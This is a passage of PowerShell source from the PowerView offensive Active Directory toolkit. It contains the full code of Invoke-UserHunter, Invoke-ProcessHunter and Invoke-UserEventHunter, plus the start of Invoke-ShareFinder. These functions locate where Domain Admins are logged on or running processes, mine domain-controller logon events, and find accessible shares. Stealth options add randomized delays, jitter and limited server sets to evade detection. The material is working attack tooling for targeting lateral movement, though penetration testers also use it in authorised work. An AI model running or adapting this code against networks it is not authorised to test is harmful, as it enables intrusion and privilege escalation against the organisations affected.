        PS C:\> Invoke-UserHunter -GroupName "Power Users" -Delay 60

        Find machines on the domain where members of the "Power Users" groups are
        logged into with a 60 second (+/- *.3) randomized delay between
        touching each host.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -TargetServer FILESERVER

        Query FILESERVER for useres who are effective local administrators using
        Get-NetLocalGroup -Recurse, and hunt for that user set on the network.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -SearchForest

        Find all machines in the current forest where domain admins are logged in.

    .EXAMPLE

        PS C:\> Invoke-UserHunter -Stealth

        Executes old Invoke-StealthUserHunter functionality, enumerating commonly
        used servers and checking just sessions for each.

    .LINK
        http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [String]
        $UserList,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All",

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-UserHunter with delay of $Delay"

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            # use the local domain
            $TargetDomains = @( (Get-NetDomain).name )
        }

        #####################################################
        #
        # First we build the host target set
        #
        #####################################################

        if(!$Hosts) { 
            # if we're using a host list, read the targets in and add them to the target list
            if($HostList) {
                if (Test-Path -Path $HostList) {
                    $Hosts = Get-Content -Path $HostList
                }
                else {
                    throw "[!] Input file '$HostList' doesn't exist!"
                }
            }
            elseif($Stealth) {
                # if we're only checking sessions on commonly used servers
                [Array]$Hosts

                Write-Verbose "Stealth mode! Enumerating comonnly used servers"

                ForEach ($Domain in $TargetDomains) {
                    if (($StealthSource -eq "File") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for File Servers..."
                        $Hosts += Get-NetFileServer -Domain $Domain
                    }
                    elseif (($StealthSource -eq "DFS") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for DFS Servers..."
                        $Hosts += Get-DFSshare -Domain $Domain | ForEach-Object {$_.RemoteServerName}
                    }
                    elseif (($StealthSource -eq "DC") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for Domain Controllers..."
                        $Hosts += Get-NetDomainController -Domain $Domain | ForEach-Object {$_.Name}
                    }
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"
                    $Hosts = Get-NetComputer -Domain $Domain -Filter $HostFilter -ADSpath $HostADSpath
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $Hosts = $Hosts | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            $HostCount = $Hosts.Count
            if($HostCount -eq 0) {
                throw "No hosts found!"
            }
        }

        #####################################################
        #
        # Now we build the user target set
        #
        #####################################################

        # users we're going to be searching for
        $TargetUsers = @()

        # get the current user so we can ignore it in the results
        $CurrentUser = ([Environment]::UserName).toLower()

        # if we're showing all results, skip username enumeration
        if($ShowAll) {
            $User = New-Object PSObject
            $User | Add-Member Noteproperty 'MemberDomain' $Null
            $User | Add-Member Noteproperty 'MemberName' '*'
            $TargetUsers = @($User)
        }
        # if we want to hunt for the effective domain users who can access a target server
        elseif($TargetServer) {
            Write-Verbose "Querying target server '$TargetServer' for local users"
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                $User = New-Object PSObject
                $User | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $User | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                $User
            }  | Where-Object {$_}
        }
        # if we get a specific username, only use that
        elseif($UserName) {
            Write-Verbose "[*] Using target user '$UserName'..."
            $User = New-Object PSObject
            $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]
            $User | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
            $TargetUsers = @($User)
        }
        # read in a target user list if we have one
        elseif($UserList) {
            # make sure the list exists
            if (Test-Path -Path $UserList) {
                $TargetUsers = Get-Content -Path $UserList | ForEach-Object {
                    $User = New-Object PSObject
                    $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]
                    $User | Add-Member Noteproperty 'MemberName' $_
                    $User
                }  | Where-Object {$_}
            }
            else {
                throw "[!] Input file '$UserList' doesn't exist!"
            }
        }
        elseif($ADSpath -or $UserFilter) {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users"
                $TargetUsers += Get-NetUser -Domain $Domain -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                    $User = New-Object PSObject
                    $User | Add-Member Noteproperty 'MemberDomain' $Domain
                    $User | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $User
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain
            }
        }

        if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }

        # script block that enumerates a server
        $HostEnumBlock = {
            param($Server, $Ping, $TargetUsers, $CurrentUser, $Stealth)

            # optionally check if the server is up first
            $Up = $True
            if($Ping) {
                $Up = Test-Server -Server $Server
            }
            if($Up) {
                # get active sessions
                $Sessions = Get-NetSession -HostName $Server
                ForEach ($Session in $Sessions) {
                    $UserName = $Session.sesi10_username
                    $CName = $Session.sesi10_cname

                    if($CName -and $CName.StartsWith("\\")) {
                        $CName = $CName.TrimStart("\")
                    }

                    # make sure we have a result
                    if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {

                        $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                            $IP = Get-HostIP -HostName $Server
                            $FoundUser = New-Object PSObject
                            $FoundUser | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
                            $FoundUser | Add-Member Noteproperty 'UserName' $UserName
                            $FoundUser | Add-Member Noteproperty 'Computer' $Server
                            $FoundUser | Add-Member Noteproperty 'IP' $IP
                            $FoundUser | Add-Member Noteproperty 'SessionFrom' $CName

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess) {
                                $Admin = Invoke-CheckLocalAdminAccess -Hostname $CName
                                $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin
                            }
                            else {
                                $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null
                            }
                            $FoundUser
                        }
                    }                                    
                }
                if(!$Stealth) {
                    # if we're not 'stealthy', enumerate loggedon users as well
                    $LoggedOn = Get-NetLoggedon -HostName $Server
                    ForEach ($User in $LoggedOn) {
                        $UserName = $User.wkui1_username
                        # TODO: translate domain to authoratative name
                        #   then match domain name ?
                        $UserDomain = $User.wkui1_logon_domain

                        # make sure wet have a result
                        if (($UserName) -and ($UserName.trim() -ne '')) {

                            $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                $IP = Get-HostIP -HostName $Server
                                $FoundUser = New-Object PSObject
                                $FoundUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                                $FoundUser | Add-Member Noteproperty 'UserName' $UserName
                                $FoundUser | Add-Member Noteproperty 'Computer' $Server
                                $FoundUser | Add-Member Noteproperty 'IP' $IP
                                $FoundUser | Add-Member Noteproperty 'SessionFrom' $Null

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess) {
                                    $Admin = Invoke-CheckLocalAdminAccess -Hostname $Server
                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin
                                }
                                else {
                                    $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $FoundUser
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -Hosts $Hosts -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($Hosts.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($Server) if(Test-Connection -ComputerName $Server -Count 1 -Quiet -ErrorAction Stop){$Server}}
                $Hosts = Invoke-ThreadedFunction -NoImports -Hosts $Hosts -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($Hosts.count)"
            $Counter = 0

            ForEach ($Server in $Hosts) {

                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Server ($Counter of $($Hosts.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Server, $False, $TargetUsers, $CurrentUser, $Stealth
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose "[*] Target user found, returning early"
                    return
                }
            }
        }

    }
}


function Invoke-StealthUserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [String]
        $UserList,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All"
    )
    # kick off Invoke-UserHunter with stealth options
    Invoke-UserHunter -Stealth @PSBoundParameters
}


function Invoke-ProcessHunter {
<#
    .SYNOPSIS

        Query the process lists of remote machines, searching for
        processes with a specific name or owned by a specific user.
        Thanks to @paulbrandau for the approach idea.
        
        Author: @harmj0y
        License: BSD 3-Clause

    .PARAMETER Hosts

        Host array to enumerate, passable on the pipeline.

    .PARAMETER HostList

        List of hostnames/IPs to search.

    .PARAMETER HostFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER HostADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ProcessName

        The name of the process to hunt, or a comma separated list of names.

    .PARAMETER GroupName

        Group name to query for target users.

    .PARAMETER TargetServer

        Hunt for users who are effective local admins on a target server.

    .PARAMETER UserName

        Specific username to search for.

    .PARAMETER UserFilter

        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"

    .PARAMETER UserADSpath

        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER UserList

        List of usernames to search for.

    .PARAMETER RemoteUserName

        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

    .PARAMETER RemotePassword

        The password to use for the WMI call on a remote system.

    .PARAMETER StopOnSuccess

        Stop hunting after finding after finding a target user/process.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain for query for machines, defaults to the current domain.

    .PARAMETER ShowAll

        Return all user location results, i.e. Invoke-UserView functionality.

    .PARAMETER SearchForest

        Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -Domain 'testing'
        
        Finds machines on the 'testing' domain where domain admins have a
        running process.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -Threads 20

        Multi-threaded process hunting, replaces Invoke-ProcessHunterThreaded.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -UserList users.txt -HostList hosts.txt
        
        Finds machines in hosts.txt where any members of users.txt have running
        processes.

    .EXAMPLE

        PS C:\> Invoke-ProcessHunter -GroupName "Power Users" -Delay 60
        
        Find machines on the domain where members of the "Power Users" groups have
        running processes with a 60 second (+/- *.3) randomized delay between
        touching each host.

    .LINK

        http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [String]
        $ProcessName,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [String]
        $UserList,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-ProcessHunter with delay of $Delay"

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            # use the local domain
            $TargetDomains = @( (Get-NetDomain).name )
        }

        #####################################################
        #
        # First we build the host target set
        #
        #####################################################

        if(!$Hosts) { 
            # if we're using a host list, read the targets in and add them to the target list
            if($HostList) {
                if (Test-Path -Path $HostList) {
                    $Hosts = Get-Content -Path $HostList
                }
                else {
                    throw "[!] Input file '$HostList' doesn't exist!"
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"
                    $Hosts = Get-NetComputer -Domain $Domain -Filter $HostFilter -ADSpath $HostADSpath
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $Hosts = $Hosts | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            $HostCount = $Hosts.Count
            if($HostCount -eq 0) {
                throw "No hosts found!"
            }
        }

        #####################################################
        #
        # Now we build the user target set
        #
        #####################################################

        if(!$ProcessName) {
            Write-Verbose "No process name specified, building a target user set"

            # users we're going to be searching for
            $TargetUsers = @()

            # if we want to hunt for the effective domain users who can access a target server
            if($TargetServer) {
                Write-Verbose "Querying target server '$TargetServer' for local users"
                $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                    ($_.AccountName).split("/")[1].toLower()
                }  | Where-Object {$_}
            }
            # if we get a specific username, only use that
            elseif($UserName) {
                Write-Verbose "[*] Using target user '$UserName'..."
                $TargetUsers = @( $UserName.ToLower() )
            }
            # read in a target user list if we have one
            elseif($UserList) {
                # make sure the list exists
                if (Test-Path -Path $UserList) {
                    $TargetUsers = Get-Content -Path $UserList | ForEach-Object {
                        $_
                    }  | Where-Object {$_}
                }
                else {
                    throw "[!] Input file '$UserList' doesn't exist!"
                }
            }
            elseif($ADSpath -or $UserFilter) {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for users"
                    $TargetUsers += Get-NetUser -Domain $Domain -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                        $_.samaccountname
                    }  | Where-Object {$_}
                }            
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                    $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain | % {
                        $_.MemberName
                    }
                }
            }

            if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
                throw "[!] No users found to search for!"
            }
        }

        # script block that enumerates a server
        $HostEnumBlock = {
            param($Server, $Ping, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword)

            # optionally check if the server is up first
            $Up = $True
            if($Ping) {
                $Up = Test-Server -Server $Server
            }
            if($Up) {
                # try to enumerate all active processes on the remote host
                # and search for a specific process name
                if($RemoteUserName -and $RemotePassword) {
                    $Processes = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -HostName $Server -ErrorAction SilentlyContinue
                }
                else {
                    $Processes = Get-NetProcess -HostName $Server -ErrorAction SilentlyContinue
                }

                ForEach ($Process in $Processes) {
                    # if we're hunting for a process name or comma-separated names
                    if($ProcessName) {
                        $ProcessName.split(",") | ForEach-Object {
                            if ($Process.Process -match $_) {
                                $Process
                            }
                        }
                    }
                    # if the session user is in the target list, display some output
                    elseif ($TargetUsers -contains $Process.User) {
                        $Process
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ProcessName' = $ProcessName
                'TargetUsers' = $TargetUsers
                'RemoteUserName' = $RemoteUserName
                'RemotePassword' = $RemotePassword
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -Hosts $Hosts -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($Hosts.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($Server) if(Test-Connection -ComputerName $Server -Count 1 -Quiet -ErrorAction Stop){$Server}}
                $Hosts = Invoke-ThreadedFunction -NoImports -Hosts $Hosts -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($Hosts.count)"
            $Counter = 0

            ForEach ($Server in $Hosts) {

                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Server ($Counter of $($Hosts.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Server, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose "[*] Target user/process found, returning early"
                    return
                }
            }
        }

    }
}


function Invoke-UserEventHunter {
<#
    .SYNOPSIS

        Queries all domain controllers on the network for account
        logon events (ID 4624) and TGT request events (ID 4768),
        searching for target users.

        Note: Domain Admin (or equiv) rights are needed to query
        this information from the DCs.

        Author: @sixdub, @harmj0y
        License: BSD 3-Clause

    .PARAMETER Hosts

        Host array to enumerate, passable on the pipeline.

    .PARAMETER HostList

        List of hostnames/IPs to search.

    .PARAMETER HostFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER HostADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER GroupName

        Group name to query for target users.

    .PARAMETER TargetServer

        Hunt for users who are effective local admins on a target server.

    .PARAMETER UserName

        Specific username to search for.

    .PARAMETER UserFilter

        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"

    .PARAMETER UserADSpath

        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER UserList

        List of usernames to search for.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Domain

        Domain for query for machines, defaults to the current domain.

    .PARAMETER SearchDays

        Number of days back to search logs for. Default 3.

    .PARAMETER SearchForest

        Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-UserEventHunter

    .LINK

        http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [String]
        $ProcessName,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [String]
        $UserList,

        [String]
        $Domain,

        [Int32]
        $SearchDays = 3,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-UserEventHunter"

        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            # use the local domain
            $TargetDomains = @( (Get-NetDomain).name )
        }

        #####################################################
        #
        # First we build the host target set
        #
        #####################################################

        if(!$Hosts) { 
            # if we're using a host list, read the targets in and add them to the target list
            if($HostList) {
                if (Test-Path -Path $HostList) {
                    $Hosts = Get-Content -Path $HostList
                }
                else {
                    throw "[!] Input file '$HostList' doesn't exist!"
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for domain controllers"
                    $Hosts = Get-NetDomainController -Domain $Domain | ForEach-Object {$_.Name}
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $Hosts = $Hosts | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            $HostCount = $Hosts.Count
            if($HostCount -eq 0) {
                throw "No hosts found!"
            }
        }

        #####################################################
        #
        # Now we build the user target set
        #
        #####################################################

        # users we're going to be searching for
        $TargetUsers = @()

        # if we want to hunt for the effective domain users who can access a target server
        if($TargetServer) {
            Write-Verbose "Querying target server '$TargetServer' for local users"
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                ($_.AccountName).split("/")[1].toLower()
            }  | Where-Object {$_}
        }
        # if we get a specific username, only use that
        elseif($UserName) {
            Write-Verbose "[*] Using target user '$UserName'..."
            $TargetUsers = @( $UserName.ToLower() )
        }
        # read in a target user list if we have one
        elseif($UserList) {
            # make sure the list exists
            if (Test-Path -Path $UserList) {
                $TargetUsers = Get-Content -Path $UserList | ForEach-Object {
                    $_
                }  | Where-Object {$_}
            }
            else {
                throw "[!] Input file '$UserList' doesn't exist!"
            }
        }
        elseif($ADSpath -or $UserFilter) {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users"
                $TargetUsers += Get-NetUser -Domain $Domain -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                    $_.samaccountname
                }  | Where-Object {$_}
            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain | % {
                    $_.MemberName
                }
            }
        }

        if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }

        # script block that enumerates a server
        $HostEnumBlock = {
            param($Server, $Ping, $TargetUsers, $SearchDays)

            # optionally check if the server is up first
            $Up = $True
            if($Ping) {
                $Up = Test-Server -Server $Server
            }
            if($Up) {
                # try to enumerate 
                Get-UserEvent -ComputerName $Server -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
                    # filter for the target user set
                    $TargetUsers -contains $_.UserName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'SearchDays' = $SearchDays
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -Hosts $Hosts -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($Hosts.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($Server) if(Test-Connection -ComputerName $Server -Count 1 -Quiet -ErrorAction Stop){$Server}}
                $Hosts = Invoke-ThreadedFunction -NoImports -Hosts $Hosts -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($Hosts.count)"
            $Counter = 0

            ForEach ($Server in $Hosts) {

                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Server ($Counter of $($Hosts.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Server, $(-not $NoPing), $TargetUsers, $SearchDays
            }
        }

    }
}


function Invoke-ShareFinder {
<#
    .SYNOPSIS

        Finds (non-standard) shares on machines in the domain.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it lists of active shares with Get-NetShare. Non-standard shares
        can be filtered out with -Exclude* flags.

    .PARAMETER Hosts

        Host array to enumerate, passable on the pipeline.

    .PARAMETER HostList

        List of hostnames/IPs to search.

    .PARAMETER HostFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER HostADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ExcludeStandard

        Exclude standard shares from display (C$, IPC$, print$ etc.)

    .PARAMETER ExcludePrint

        Exclude the print$ share.

    .PARAMETER ExcludeIPC

        Exclude the IPC$ share.

    .PARAMETER CheckShareAccess

        Only display found shares that the local user has access to.

    .PARAMETER CheckAdmin

        Only display ADMIN$ shares the local user has access to.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0.

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3.

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -ExcludeStandard

        Find non-standard shares on the domain.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -Threads 20

        Multi-threaded share finding, replaces Invoke-ShareFinderThreaded.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -Delay 60

        Find shares on the domain with a 60 second (+/- *.3)
        randomized delay between touching each host.

    .EXAMPLE

        PS C:\> Invoke-ShareFinder -HostList hosts.txt

        Find shares for machines in the specified hostlist.

    .LINK
    http://blog.harmj0y.net
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,
 
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-ShareFinder with delay of $Delay"

        # figure out the shares we want to ignore
        [String[]] $ExcludedShares = @('')

        if ($ExcludePrint) {
            $ExcludedShares = $ExcludedShares + "PRINT$"
        }
        if ($ExcludeIPC) {
            $ExcludedShares = $ExcludedShares + "IPC$"
        }
        if ($ExcludeStandard) {
            $ExcludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }

        if(!$Hosts) { 

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                # get ALL the domains in the forest to search
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                # use the local domain
                $TargetDomains = @( (Get-NetDomain).name )
            }

            # if we're using a host list, read the targets in and add them to the target list
            if($HostList) {
                if (Test-Path -Path $HostList) {
                    $Hosts = Get-Content -Path $HostList
                }
                else {
                    throw "[!] Input file '$HostList' doesn't exist!"
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"
                    $Hosts = Get-NetComputer -Domain $Domain -Filter $HostFilter -ADSpath $HostADSpath
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $Hosts = $Hosts | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            $HostCount = $Hosts.Count
            if($HostCount -eq 0) {
